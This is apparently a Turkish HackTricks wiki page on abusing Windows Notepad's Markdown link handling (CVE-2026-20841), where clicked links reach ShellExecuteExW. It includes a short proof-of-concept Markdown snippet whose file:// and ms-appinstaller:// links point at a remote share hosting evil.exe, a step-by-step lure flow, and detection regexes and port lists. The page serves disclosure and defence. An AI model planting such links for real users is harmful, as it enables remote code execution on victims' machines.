# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Markdown veya HTML render eden Windows uygulamaları, tıklanan hedefleri `ShellExecuteExW`'ye iletebilir. ShellExecute kayıtlı URI şemalarını ve dosya ilişkilendirmelerini kullandığından, bir renderer her bağlantının HTTP(S) olduğunu varsaymak yerine açık bir allowlist kullanmalıdır. Aşağıda açıklanan Notepad davranışı CVE-2026-20841 ile ilgilidir ve tüm rendererlara genellenmemelidir.<sup>[[1]](#references)[[3]](#references)</sup>

## Windows Notepad Markdown modunda ShellExecuteExW yüzeyi
- Notepad, Markdown modunu yalnızca `.md` uzantıları için, `sub_1400ED5D0()` içindeki sabit bir string karşılaştırmasıyla seçer.<sup>[[1]](#references)</sup>
- Desteklenen Markdown bağlantıları:
  - Standart: `[text](target)`
  - Autolink: `<target>` (`[target](target)` olarak render edilir); bu nedenle payload'lar ve tespitler için her iki sözdizimi de önemlidir.
- Bağlantı tıklamaları, zayıf filtreleme uyguladıktan sonra `ShellExecuteExW` çağıran `sub_140170F60()` içinde işlenir.
- `ShellExecuteExW` yalnızca HTTP(S)'ye değil, **yapılandırılmış tüm protocol handler'lara** yönlendirme yapar.<sup>[[1]](#references)</sup>

### Payload ile ilgili noktalar
- Bağlantıdaki tüm `\\` dizileri, `ShellExecuteExW` çağrılmadan önce `\` olarak **normalize edilir**; bu durum UNC/path oluşturmayı ve tespiti etkiler.
- `.md` dosyaları varsayılan olarak Notepad ile **ilişkilendirilmez**; kurbanın dosyayı Notepad'de açıp bağlantıya tıklaması gerekir, ancak dosya render edildikten sonra bağlantı tıklanabilir.
- Tehlikeli örnek şemalar:<sup>[[1]](#references)</sup>
  - Yerel/UNC payload başlatmak için `file://`.
  - App Installer akışlarını tetiklemek için `ms-appinstaller://`. Yerel olarak kayıtlı diğer şemalar da kötüye kullanılabilir.

### Minimal PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```

### Exploitation akışı
1. Notepad’in Markdown olarak görüntülemesi için bir **`.md` dosyası** oluşturun.
2. Tehlikeli bir URI şeması (`file:`, `ms-appinstaller:` veya yüklü herhangi bir handler) kullanan bir bağlantı ekleyin.
3. Dosyayı (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB veya benzeri) üzerinden iletin ve kullanıcıyı dosyayı Notepad’de açmaya ikna edin.
4. Tıklandığında **normalize edilmiş bağlantı** `ShellExecuteExW`’ye iletilir ve ilgili protocol handler, başvurulan içeriği kullanıcının bağlamında çalıştırır.<sup>[[1]](#references)[[2]](#references)</sup>

## Tespit fikirleri
- `.md` dosyalarının belge iletiminde sık kullanılan portlar/protokoller üzerinden aktarımını izleyin: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Markdown bağlantılarını (standart ve autolink) ayrıştırın ve **büyük/küçük harfe duyarsız** olarak `file:` veya `ms-appinstaller:` arayın.
- Uzak kaynak erişimini yakalamak için üretici kılavuzlu regex’ler:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- ZDI tarafından açıklanan vendor fix, kabul edilen hedefleri yerel dosyalar ve HTTP(S) ile sınırlar. Kayıtlı saldırı yüzeyi sisteme göre değiştiğinden, gerektiğinde diğer yüklü protocol handler'lar için de tespitleri genişletin.<sup>[[1]](#references)</sup>

## References
- [1] [CVE-2026-20841: Windows Notepad'de Keyfi Kod Yürütme](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [2] [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)
- [3] [Microsoft Learn — `ShellExecuteExW`](https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecuteexw)
{{#include ../banners/hacktricks-training.md}}
